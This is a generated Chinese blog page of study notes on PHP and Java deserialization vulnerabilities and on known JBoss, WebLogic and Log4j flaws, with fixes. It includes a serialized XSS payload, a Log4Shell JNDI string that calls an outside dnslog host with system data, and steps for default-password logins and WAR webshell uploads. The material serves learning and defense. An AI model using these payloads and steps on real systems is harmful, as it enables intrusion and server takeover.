@@ -1,0 +1,288 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>江湖有缘见 | 江湖有缘见</title><meta name="author" content="江湖有缘见"><meta name="copyright" content="江湖有缘见"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="php和java反序列化1，php的序列化和反序列化序列化（serialize） 序列化就是把一个对象转换成字符串。便于保存在内存、文件、数据库中，作用和目的就是为了方便传输  12345678910111213141516171819例如：我们写了一个class(类)，这个class存了一些变量，当这个class被实例化之后，在使用过程中里面的一些变量值发生了变化，以后在某些时候还会用到这个变量">
+<meta property="og:type" content="article">
+<meta property="og:title" content="江湖有缘见">
+<meta property="og:url" content="https://jhyyj.com/2024/12/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="江湖有缘见">
+<meta property="og:description" content="php和java反序列化1，php的序列化和反序列化序列化（serialize） 序列化就是把一个对象转换成字符串。便于保存在内存、文件、数据库中，作用和目的就是为了方便传输  12345678910111213141516171819例如：我们写了一个class(类)，这个class存了一些变量，当这个class被实例化之后，在使用过程中里面的一些变量值发生了变化，以后在某些时候还会用到这个变量">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jhyyj.oss-cn-qingdao.aliyuncs.com/blog/touxiang.jpg">
+<meta property="article:published_time" content="2024-12-10T10:52:01.859Z">
+<meta property="article:modified_time" content="2024-12-03T10:10:30.826Z">
+<meta property="article:author" content="江湖有缘见">
+<meta property="article:tag" content="江湖有缘见 jhyyj 江湖有缘见的博客 jhyyj的博客">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jhyyj.oss-cn-qingdao.aliyuncs.com/blog/touxiang.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/jhyyj/picture@main/blog/touxiang.jpg"><link rel="canonical" href="https://jhyyj.com/2024/12/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"646V2O35EZ","apiKey":"4447dfc47e0d5bdac7755a96d436c74b","indexName":"lndex-blog","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '江湖有缘见',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-03 18:10:30'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 8 || hour >= 20
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://jhyyj.oss-cn-qingdao.aliyuncs.com/blog/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="江湖有缘见"></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-10T10:52:01.859Z" title="发表于 2024-12-10 18:52:01">2024-12-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-03T10:10:30.826Z" title="更新于 2024-12-03 18:10:30">2024-12-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="php和java反序列化"><a href="#php和java反序列化" class="headerlink" title="php和java反序列化"></a>php和java反序列化</h1><h2 id="1，php的序列化和反序列化"><a href="#1，php的序列化和反序列化" class="headerlink" title="1，php的序列化和反序列化"></a>1，php的序列化和反序列化</h2><h3 id="序列化（serialize）"><a href="#序列化（serialize）" class="headerlink" title="序列化（serialize）"></a>序列化（serialize）</h3><blockquote>
+<p>序列化就是<code>把一个对象转换成字符串</code>。便于保存在内存、文件、数据库中，作用和目的就是为了<code>方便传输</code></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">例如：我们写了一个class(类)，这个class存了一些变量，当这个class被实例化之后，在使用过程中里面的一些变量值发生了变化，以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等者下一次要用它的时候再一次调用的话，浪费系统资源。写一小型项目可能没有太大影响，但随着项目的壮大，一些小问题被放大之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再把它放出来就好了。</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;pikachu&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    serialize($s); //把这个对象进行序列化</span><br><span class="line">    序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">        O:代表object</span><br><span class="line">        1:代表对象名字长度为一个字符</span><br><span class="line">        S:对象的名称</span><br><span class="line">        1:代表对象里面有一个变量</span><br><span class="line">        s:数据类型</span><br><span class="line">        4:变量名称的长度</span><br><span class="line">        test:变量名称</span><br><span class="line">        s:数据类型</span><br><span class="line">        7:变量值的长度</span><br><span class="line">        pikachu:变量值</span><br></pre></td></tr></table></figure>
+
+<h3 id="反序列化（unserialize）"><a href="#反序列化（unserialize）" class="headerlink" title="反序列化（unserialize）"></a>反序列化（unserialize）</h3><blockquote>
+<p><code>由</code>序列化后的<code>字符串还原成对象</code>供程序使用。一般用于远程调用、通过网络将对象传输至远程服务器、存储对象到数据库或本地等待重用等场景中</p>
+</blockquote>
+<h4 id="PHP序列化和反序列化的两个函数："><a href="#PHP序列化和反序列化的两个函数：" class="headerlink" title="PHP序列化和反序列化的两个函数："></a>PHP序列化和反序列化的两个函数：</h4><blockquote>
+<p><code>serialize</code>：把对象转换成字符串</p>
+<p><code>unserialize</code>：把字符串还原为对象</p>
+</blockquote>
+<h4 id="反序列化漏洞产生的原因："><a href="#反序列化漏洞产生的原因：" class="headerlink" title="反序列化漏洞产生的原因："></a>反序列化<code>漏洞产生</code>的原因：</h4><blockquote>
+<p>序列化和反序列化本身没有问题,<code>但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</code>，<code>就是当传给unserialize()的参数</code>字符串<code>可控时，那么用户就可以注入一个精心构造的序列化字符串payload</code>。当进行反序列化的时候就有可能会触发对象中的一些魔法函数，造成意想不到的危害</p>
+</blockquote>
+<h4 id="php中常见的魔法函数："><a href="#php中常见的魔法函数：" class="headerlink" title="php中常见的魔法函数："></a>php中<code>常见的魔法函数</code>：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_`construct`()：当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">_`destruct`()：当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">_`tostring`()：当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">_`<span class="built_in">sleep</span>`()：在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">_`wakeup`()：将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">php反序列化漏洞，就是利用这些魔法函数，没有这些函数存载(参数给变量)还真利用不了</span><br></pre></td></tr></table></figure>
+
+<p>漏洞举例:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        class S&#123;</span><br><span class="line">            var <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">            <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;	<span class="comment">#当一个对象销毁时被调用,没有这个函数直接歇菜</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">test</span>;	<span class="comment">#输出</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">        @<span class="variable">$unser</span> = unserialize(<span class="variable">$a</span>);	<span class="comment">#反序列化unserialize </span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#恶意攻击代码：</span></span><br><span class="line">        payload:O:1:<span class="string">&quot;S&quot;</span>:1:&#123;s:4:<span class="string">&quot;test&quot;</span>;s:29:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br><span class="line">    	<span class="comment">#这里就是在序列化后的字符串中插入了恶意的xss攻击代码</span></span><br><span class="line"></span><br><span class="line">由此可以看出，当传给 unserialize() 的参数(序列化后的字符串)可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数</span><br></pre></td></tr></table></figure>
+
+<p>注：</p>
+<ol>
+<li>反序列化的作用和目的：<code>就是为了方便传输</code></li>
+<li>为什么要反序列化：<code>解决占用系统空间浪费系统资源的问题</code></li>
+<li>java、php、asp等语言序列化和反序列化原理都是相同的，可能用到的函数稍微不一样</li>
+<li>为什么php反序列化漏洞出现的较少，因为它有个先天条件，这个条件跟<code>php中自带的魔法函数</code>有关。为什么java反序列化漏洞很多，因为Java不存在这些魔法函数</li>
+<li><code>反序列化利用方法</code>：通过 serialize() 得到我们要的序列化字符串，之后通过精心构造再传进去</li>
+<li>php中常见的函数分类:</li>
+</ol>
+<ul>
+<li><code>构造函数</code>__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li>
+<li><code>析构函数</code>__destruct()：当对象被销毁时会自动调用。</li>
+</ul>
+<p>总结：</p>
+<p><code>序列化是把一个对象转换成可以传输的字符串，反序列化是由序列化后字符串还原成对象。比如常见的php序列化函数</code>serialize<code>和反序列化函数</code>unserialize<code>，以及php中常见的魔法函数</code>sleep<code>、</code>construct<code>、</code>destruct<code>、</code>tostring<code>、</code>wakeup<code>等等，如果这些函数在传递参数时候没有进行严格的过滤措施，那么攻击者就可以构造恶意的代码并将其序列化后传入函数中，从而导致反序列化漏洞</code></p>
+<p>拓展：</p>
+<p>1， 以黑盒（模拟黑客）测试反序列化漏洞，这个网站不是开源的，没有给你源代码，找出反序列化漏洞比登天还难不太现实，反序列化漏洞都是代码审计出来的（白盒测试）</p>
+<p>2，反序列漏洞利用的先天条件就是先将对象序列化成字符串，没有序列化后的字符串就不能反序列化。所以在看不到网站源代码的时候（代码在别人服务器上）不能反序列化，看不到别人的参数值是多少、变量是啥，所以可得时到源代码才可以反序列化</p>
+<p>3,<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<h2 id="2，Java序列化和反序列化"><a href="#2，Java序列化和反序列化" class="headerlink" title="2，Java序列化和反序列化"></a>2，Java序列化和反序列化</h2><h4 id="1，序列化（ObjectOutputStream类的writeObject）"><a href="#1，序列化（ObjectOutputStream类的writeObject）" class="headerlink" title="1，序列化（ObjectOutputStream类的writeObject）"></a>1，序列化（<code>ObjectOutputStream</code>类的<code>writeObject</code>）</h4><blockquote>
+<p>就是<code>把对象转换成字节流</code></p>
+</blockquote>
+<h4 id="2，反序列化（ObjectInputStream类的readObject）"><a href="#2，反序列化（ObjectInputStream类的readObject）" class="headerlink" title="2，反序列化（ObjectInputStream类的readObject）"></a>2，反序列化（<code>ObjectInputStream</code>类的<code>readObject</code>）</h4><blockquote>
+<p>就是<code>把字节流还原成对象</code></p>
+</blockquote>
+<h4 id="3，ObjectOutputStream-与-ObjectInputStream类，说明"><a href="#3，ObjectOutputStream-与-ObjectInputStream类，说明" class="headerlink" title="3，ObjectOutputStream 与 ObjectInputStream类，说明"></a>3，ObjectOutputStream 与 ObjectInputStream类，说明</h4><blockquote>
+<p>java中的ObjectOutputStream类的writeObject()方法可以实现序列化，ObjectInputStream类的readObject()方法用于反序列化，<code>反序列化操作就是从二进制文件中提取对象</code></p>
+</blockquote>
+<h4 id="4，实现序列化的要求"><a href="#4，实现序列化的要求" class="headerlink" title="4，实现序列化的要求"></a>4，实现序列化的要求</h4><blockquote>
+<p>只有实现了<code>Serializable</code>或<code>Externalizable</code>接口的类的对象才能被序列化，否则抛出异常。Serializable 接口是 Java 提供的序列化接口</p>
+</blockquote>
+<h3 id="5，形成漏洞的根源"><a href="#5，形成漏洞的根源" class="headerlink" title="5，形成漏洞的根源"></a>5，形成漏洞的根源</h3><blockquote>
+<p>在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制</p>
+</blockquote>
+<p>注：</p>
+<p>java发序列化的接口是readObject</p>
+<p>静态成员变量是不能被序列化</p>
+<p>序列化是针对对象属性的，而静态成员变量是属于类的</p>
+<h2 id="中间件反序列化漏洞"><a href="#中间件反序列化漏洞" class="headerlink" title="中间件反序列化漏洞"></a>中间件反序列化漏洞</h2><p>1，全球性的大众化的中间件，一定会有人把它的漏洞总结写成一篇文章发在网上，我们只要找到并复现就行</p>
+<p>3，大部分中间件都存在未授权访问，跳过登陆页面直接访问后台，还有任意文件上传漏洞</p>
+<p>4，常见的中间件漏洞？ </p>
+<p>IIS：PUT 漏洞、短文件名猜解、远程代码执行、解析漏洞</p>
+<p>Apache ：解析漏洞、目录遍历</p>
+<p>Nginx ：文件解析、目录遍历、CRLF注入、目录穿越</p>
+<p>Tomcat ：远程代码执行、war后门文件部署</p>
+<p>JBoss：反序列化漏洞、war后门文件部署</p>
+<p>WebLogic ：反序列化漏洞 SSRF 任意文件上传 war 后门文件部署 Apache Shiro 反序列化漏洞 Shiro rememberMe（Shiro-550） Shiro Padding Oracle Attack(Shiro-721)</p>
+<p>就JBoss、weblogic存在反序列化漏洞，CVE-2017、2018、2019、2021什么的漏洞编号</p>
+<h3 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h3><p>端口号：8080</p>
+<p><strong>漏洞编号：</strong>&#x3D;&#x3D;CVE-2017-12149、 CVE-2017-7504、 CVE-2013-4810、 CVE-2015-7501、 CVE-2010-1871&#x3D;&#x3D;</p>
+<p><strong>漏洞产生的原理：</strong><code>参数给变量未经严格过滤,</code>就可以导致攻击者恶意构造的代码的实现</p>
+<p><strong>jboss常见的漏洞：</strong><code>反序列</code>、<code>命令执行</code>、<code>未授权访问漏洞</code>、<code>弱口令</code>。编号cve记不记无所谓，记住有哪些漏洞就行了</p>
+<p><strong>利用方法：</strong>直接使用<code>jboss综合利用工具，提取payload。</code>工具可以执行系统命令，上传文件和木马</p>
+<p><strong>怎么判断网站使用jboss：知道后台登录页面的话，在后台登录页面会显示jboss和版本号</strong></p>
+<p><strong>复现过程：1，把url地址放在jboss漏洞综合利用工具里面去检测，2，看看受哪些漏洞影响，利用漏洞去执行系统命令，和上传木马。冰蝎内存马</strong></p>
+<p><strong>以后只要是用目录扫描工具扫描出JBoss后台登录页面，尝试默认账号密码admin admin 弱口令登录，上传war包，拿到webshell</strong>，访问war包地址：192.1.1.1&#x2F;路径&#x2F;war包里的文件名</p>
+<h4 id="1，jboss历史反序列化漏洞及编号"><a href="#1，jboss历史反序列化漏洞及编号" class="headerlink" title="1，jboss历史反序列化漏洞及编号"></a>1，jboss历史反序列化漏洞及编号</h4><h4 id="1-1，CVE-2017-12149-jboss反序列化漏洞"><a href="#1-1，CVE-2017-12149-jboss反序列化漏洞" class="headerlink" title="1.1，CVE-2017-12149 jboss反序列化漏洞"></a>1.1，<code>CVE-2017-12149</code> jboss反序列化漏洞</h4><p><em>该漏洞为 Java反序列化错误类型，利用了Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter过滤器。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞</em></p>
+<blockquote>
+<p>漏洞存在&#x2F;invoker&#x2F;readonly中，将这个payload作为POST Body发送至&#x2F;invoker&#x2F;readonly即可</p>
+</blockquote>
+<ul>
+<li><p><strong>漏洞利用条件：</strong><code>目录存在且能访问</code>[&#x2F;invoker&#x2F;readonly]</p>
+</li>
+<li><p><strong>影响版本：</strong><code>5.x/6.x</code></p>
+</li>
+<li><p><strong>漏洞验证：</strong>访问 &#x2F;invoker&#x2F;readonly 目录，<code>发现http响应码 500，说明存在漏洞</code></p>
+</li>
+<li><p><strong>漏洞利用：</strong><code>直接使用jboss漏洞综合利用工具，提取payload，向/invoker/readonly目录发送包含序列化对象的请求</code></p>
+</li>
+<li><p><strong>绕过waf：</strong>bp抓包，在请求头添加个cmd： ls</p>
+</li>
+<li><p><strong>修复：</strong><code>升级JBoss到最新版本,</code>不需要组件的直接删除</p>
+</li>
+</ul>
+<h4 id="1-2，CVE-2017-7504-jboss反序列化漏洞"><a href="#1-2，CVE-2017-7504-jboss反序列化漏洞" class="headerlink" title="1.2，CVE-2017-7504 jboss反序列化漏洞"></a>1.2，<code>CVE-2017-7504 jboss</code>反序列化漏洞</h4><p><em>JBossAS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码执行</em></p>
+<blockquote>
+<p>漏洞存在&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet中，将这个payload作为POST Body发送至&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet即可</p>
+</blockquote>
+<ul>
+<li><strong>影响版本：</strong>4.x及以前</li>
+<li><strong>修复：</strong><code>升级JBoss到最新版本</code></li>
+</ul>
+<h4 id="1-3，JMXInvokerServlet-jboss反序列化漏洞"><a href="#1-3，JMXInvokerServlet-jboss反序列化漏洞" class="headerlink" title="1.3，JMXInvokerServlet jboss反序列化漏洞"></a>1.3，<code>JMXInvokerServlet</code> jboss反序列化漏洞</h4><p><em>这是经典的JBoss反序列化漏洞，JBoss在&#x2F;invoker&#x2F;JMXInvokerServle请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码</em></p>
+<blockquote>
+<p>洞存在&#x2F;invoker&#x2F;JMXInvokerServlet中,将这个payload作为POST Body发送至JMXInvokerServlet-deserialization即可</p>
+</blockquote>
+<ul>
+<li><strong>影响版本：</strong>6.x</li>
+<li><strong>利用：</strong>直接使用工具，上传文件</li>
+<li><strong>修复：</strong><code>升级JBoss到最新版本,</code>禁止将JBoss的JMXInvokerServlet接口对外开放</li>
+</ul>
+<p>注：以上三个历史漏洞都是java反序列化漏洞，漏洞产生原理都一样。利用方法是直接使用工具进行漏洞利用,提取payload</p>
+<h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>端口号：&#x3D;&#x3D;7001&#x3D;&#x3D;</p>
+<p><code>CVE-2020-2551</code>IIOP协议反序列化漏洞</p>
+<p><code>CVE-2021-2394</code>反序列化漏洞</p>
+<p><code>CVE-2018-2628</code>JAVA发序列化漏洞</p>
+<p><code>CVE-2018-2894</code>任意文件上传漏洞</p>
+<p><code>cve-2019-2725</code>反序列化漏洞</p>
+<p><code>SSRF漏洞</code>(需要安装weblogic时选择UDDI组件)</p>
+<p><code>弱口令漏洞</code>账号密码都是weblogic</p>
+<p><strong>怎么利用，复现：利用weblogic漏洞利用综合工具，上传内存马，执行系统命令。</strong></p>
+<p>​	<strong>手工，网上payload，打开bp，在post包里插入&lt; payload:恶意攻击代码 &gt;,直接照网上文章复现</strong></p>
+<p>​	      </p>
+<h2 id="apache-log4j"><a href="#apache-log4j" class="headerlink" title="apache log4j"></a>apache log4j</h2><p>它是一个java包，它不能通过网站去判断这个网站有没有使用apache log4j，只能通过解压缩工具打开java包里的内容去判断</p>
+<p>1、Apache Log4j是一个开放源码的Java日志记录库，主要帮助开发人员更轻松地控制日志级别，构建记录器，以及在多种日志目标之间转换，而无需修改日志消息。<br>2、漏洞影响版本：Apache Log4j 2.x &lt;&#x3D; 2.14.1<br>3、漏洞原理：由于 Log4j 2 提供的 <code>lookup 功能造成的</code>，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，<code>并未对输入进行严格的判断</code>，从而造成漏洞的发生。<br>4、攻击代码poc怎么写：${jndi:ldap:&#x2F;&#x2F;${sys:os.arch}.iswaen.dnslog.cn}</p>
+<p>​	$接大括号jndi冒号ldap接dnslog地址，</p>
+<p>测试过程：随便找个网站有输入的页面，比如登录页面，只要有参数接受的地方因为他是个日志库，输入攻击代码poc$接大括号jndi冒号ldap接dnslog地址dnslog有回显</p>
+<p>5、修复方案：JAVA7版本升级至log4j 2.12.4版本，JAVA8及以上版本升级至log4j 2.17.0版本，升级包中移除了对lookup功能的支持，禁用了JNDI方法或移除log4j包中JndiLookup类</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jhyyj.com">江湖有缘见</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jhyyj.com/2024/12/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://jhyyj.com/2024/12/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jhyyj.com" target="_blank">江湖有缘见</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" 